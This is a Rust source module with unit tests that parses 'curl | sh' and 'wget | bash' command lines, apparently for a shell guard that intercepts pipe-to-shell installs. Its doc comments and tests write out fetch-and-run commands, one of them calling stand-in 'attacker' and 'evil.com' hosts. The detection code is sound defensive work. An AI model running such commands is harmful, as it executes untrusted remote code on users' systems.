//! `curl | sh` interceptor primitive (TASK-315).
//!
//! The shipped `tools/myth-pipe-guard/freally_pipe_guard.sh`
//! shell function intercepts pipe-to-shell idioms users opt
//! into. The shell script invokes `freallyctl pipe-guard
//! <cmdline>` whose Rust side is this module — it parses the
//! reconstructed command line and emits the URL the script
//! would otherwise execute.
//!
//! Pure-string analysis; no network.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PipeGuardDecision {
    /// The remote URL the pipe-to-shell would fetch.
    pub fetched_url: String,
    /// `curl` or `wget` — whichever opened the pipe.
    pub fetcher: String,
    /// Shell on the receiving end (`sh`, `bash`, `zsh`).
    pub shell: String,
}

/// Returns `Some` when `command_line` matches a recognised
/// pipe-to-shell shape.
///
/// Accepted shapes:
///
///   * `curl -fsSL https://example.com/install | sh`
///   * `wget -O- https://example.com/install | bash`
///   * `curl https://example.com/install | bash -s -- arg`
///   * with the right-hand side preceded by `sudo`.
pub fn analyze(command_line: &str) -> Option<PipeGuardDecision> {
    let (left, right) = command_line.split_once('|')?;
    let fetcher_part = left.trim();
    let shell_part = right.trim();
    let (fetcher, url) = parse_fetcher(fetcher_part)?;
    let shell = parse_shell(shell_part)?;
    Some(PipeGuardDecision {
        fetched_url: url,
        fetcher: fetcher.to_string(),
        shell: shell.to_string(),
    })
}

fn parse_fetcher(s: &str) -> Option<(&'static str, String)> {
    let tokens: Vec<&str> = s.split_whitespace().collect();
    if tokens.is_empty() {
        return None;
    }
    let bin_idx = if tokens[0] == "sudo" && tokens.len() > 1 {
        1
    } else {
        0
    };
    let fetcher = identify_fetcher(tokens[bin_idx])?;
    // Walk tokens after the fetcher binary. Skip any URL token whose
    // immediate predecessor is a flag that takes a URL argument
    // (`--proxy`, `--proxy-url`, `-x`, `--referer`, `--url-template`)
    // so the install URL isn't misattributed when a proxy is set.
    const URL_ARG_FLAGS: &[&str] = &[
        "--proxy",
        "--proxy-url",
        "-x",
        "--referer",
        "--referer-url",
        "--cacert",
        "--url",
    ];
    let mut url: Option<&str> = None;
    for i in (bin_idx + 1)..tokens.len() {
        let t = tokens[i];
        if !(t.starts_with("http://") || t.starts_with("https://")) {
            continue;
        }
        let prev = if i > 0 { tokens[i - 1] } else { "" };
        if URL_ARG_FLAGS.contains(&prev) {
            continue;
        }
        url = Some(t);
        break;
    }
    Some((fetcher, url?.to_string()))
}

fn identify_fetcher(name: &str) -> Option<&'static str> {
    match name {
        "curl" | "/usr/bin/curl" => Some("curl"),
        "wget" | "/usr/bin/wget" => Some("wget"),
        _ => None,
    }
}

fn parse_shell(s: &str) -> Option<&'static str> {
    let tokens: Vec<&str> = s.split_whitespace().collect();
    if tokens.is_empty() {
        return None;
    }
    let first = if tokens[0] == "sudo" && tokens.len() > 1 {
        tokens[1]
    } else {
        tokens[0]
    };
    match first {
        "sh" | "/bin/sh" => Some("sh"),
        "bash" | "/bin/bash" | "/usr/bin/bash" => Some("bash"),
        "zsh" | "/bin/zsh" | "/usr/bin/zsh" => Some("zsh"),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_curl_pipe_sh() {
        let d = analyze("curl -fsSL https://example.com/i | sh").unwrap();
        assert_eq!(d.fetcher, "curl");
        assert_eq!(d.shell, "sh");
        assert_eq!(d.fetched_url, "https://example.com/i");
    }

    #[test]
    fn detects_wget_pipe_bash() {
        let d = analyze("wget -O- https://r.com/p | bash").unwrap();
        assert_eq!(d.fetcher, "wget");
        assert_eq!(d.shell, "bash");
    }

    #[test]
    fn detects_sudo_form() {
        let d = analyze("sudo curl https://x.com/i | sudo bash").unwrap();
        assert_eq!(d.fetcher, "curl");
        assert_eq!(d.shell, "bash");
    }

    #[test]
    fn skips_proxy_url_picks_install_url() {
        let d = analyze("curl --proxy http://attacker:8080 https://evil.com/i | sh").unwrap();
        assert_eq!(d.fetched_url, "https://evil.com/i");
    }

    #[test]
    fn rejects_non_pipe_to_shell() {
        assert!(analyze("curl https://x.com | jq .").is_none());
        assert!(analyze("ls /tmp").is_none());
    }
}
